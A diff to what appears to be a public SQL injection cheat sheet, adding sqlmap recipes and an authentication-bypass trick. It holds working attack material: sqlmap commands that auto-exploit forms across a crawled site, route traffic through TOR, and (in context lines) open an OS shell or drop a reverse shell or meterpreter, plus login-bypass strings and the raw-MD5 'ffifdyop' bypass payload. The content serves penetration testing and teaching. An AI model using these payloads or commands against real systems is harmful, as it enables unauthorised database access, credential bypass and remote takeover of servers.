@@ -1,6 +1,6 @@
 # SQL injection
 
-A SQL injection attack consists of insertion or "injection" of a SQL query via the input data from the client to the application
+A SQL injection attack consists of insertion or "injection" of a SQL query via the input data from the client to the application.
 
 ## Summary
 
@@ -9,12 +9,13 @@ A SQL injection attack consists of insertion or "injection" of a SQL query via t
 * [CheatSheet OracleSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20injection/OracleSQL%20Injection.md)
 * [CheatSheet PostgreSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20injection/PostgreSQL%20Injection.md)
 * [CheatSheet SQLite Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20injection/SQLite%20Injection.md)
+* [CheatSheet Cassandra Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20injection/Cassandra%20Injection.md)
 * [Entry point detection](#entry-point-detection)
 * [DBMS Identification](#dbms-identification)
 * [SQL injection using SQLmap](#sql-injection-using-sqlmap)
 * [Authentication bypass](#authentication-bypass)
 * [Polyglot injection](#polyglot-injection-multicontext)
-* [Second order injection](#second-order-injection)
+* [Routed injection](#routed-injection)
 * [Insert Statement - ON DUPLICATE KEY UPDATE](#insert-statement---on-duplicate-key-update)
 * [WAF Bypass](#waf-bypass)
 
@@ -135,6 +136,28 @@ python sqlmap.py -u "http://example.com/?id=1"  -p id --os-shell
 
 Dropping a reverse-shell / meterpreter
 python sqlmap.py -u "http://example.com/?id=1"  -p id --os-pwn
+```
+
+Crawl a website with SQLmap and auto-exploit
+
+```powershell
+sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3
+
+--batch = non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
+--crawl = how deep you want to crawl a site
+--forms = Parse and test forms
+```
+
+Using TOR with SQLmap
+
+```powershell
+sqlmap -u "http://www.target.com" --tor --tor-type=SOCKS5 --time-sec 11 --check-tor --level=5 --risk=3 --threads=5
+```
+
+Using Chrome cookie and a Proxy
+
+```powershell
+sqlmap -u "https://test.com/index.php?id=99" --load-cookie=/media/truecrypt1/TI/cookie.txt --proxy "http://127.0.0.1:8080"  -f  --time-sec 15 --level 3
 ```
 
 Using suffix to tamper the injection
@@ -291,6 +314,22 @@ admin") or "1"="1"#
 admin") or "1"="1"/*
 1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
 ```
+
+## Authentication Bypass (Raw MD5)
+
+When a raw md5 is used, the pass will be queried as a simple string, not a hexstring.
+
+```php
+"SELECT * FROM admin WHERE pass = '".md5($password,true)."'"
+```
+
+Allowing an attacker to craft a string with a `true` statement such as `' or 'SOMETHING`
+
+```php
+md5("ffifdyop", true) = 'or'6�]��!r,��b
+```
+
+Challenge demo available at [http://web.jarvisoj.com:32772](http://web.jarvisoj.com:32772)
 
 ## Polyglot injection (multicontext)
 
